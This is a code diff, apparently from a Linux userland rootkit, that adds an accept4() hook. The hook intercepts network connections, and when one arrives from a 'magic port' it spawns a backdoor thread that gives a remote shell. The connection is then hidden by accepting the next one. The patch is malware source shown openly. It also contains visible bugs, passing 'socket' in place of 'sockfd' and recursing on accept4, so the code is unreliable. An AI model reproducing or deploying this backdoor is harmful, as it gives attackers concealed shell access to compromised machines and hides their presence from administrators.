@@ -218,6 +218,34 @@ int ioctl(int fd, unsigned long request, unsigned long *argp){
     return hooked_ioctl(fd, request, argp);
 }
 
+int accept4(int sockfd, struct sockaddr_in *address, socklen_t *address_len, int flags){
+    #ifdef DEBUG
+    printf("[-] hooking accept\n");
+    #endif
+
+    if (!hooked_accept4){
+        hooked_accept4 = load_libc("accept4");
+    }
+    int fd = hooked_accept4(socket, address, address_len, flags);
+    if (fd == -1){
+        return fd;
+    }
+    int port = (int) ntohs(address->sin_port);
+    
+    // if connection comes from magic port spawn a shell and redirect I/O
+    if (port == MAGIC_PORT){
+        #ifdef DEBUG
+        printf("[+] port hooked: %d, %d\n", port, fd);
+        #endif
+        pthread_t thread;
+        int *pfd = malloc(sizeof(*pfd));
+        *pfd = fd;
+        pthread_create(&thread, NULL, backdoor, pfd);
+        return accept4(socket, address, address_len, flags);
+    }
+    return fd;
+}
+
 int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
     #ifdef DEBUG
     printf("[-] hooking accept\n");
